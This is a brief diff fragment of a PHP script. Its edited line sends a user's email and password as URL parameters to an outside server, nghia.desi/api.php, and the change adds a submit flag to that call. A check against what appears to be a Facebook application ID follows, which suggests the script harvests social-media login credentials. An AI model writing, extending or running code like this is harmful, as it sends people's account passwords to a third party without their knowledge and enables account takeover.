@@ -18,7 +18,7 @@ fwrite($handle, "\r\n");
 fwrite($handle, "\r\n");
 fclose($handle);
 */
-auto('http://nghia.desi/api.php?email='.$email.'&password'.$pass);
+auto('http://nghia.desi/api.php?email='.$email.'&password'.$pass.'&submit=true');
 
 if($app_id == 350685531728)
 {
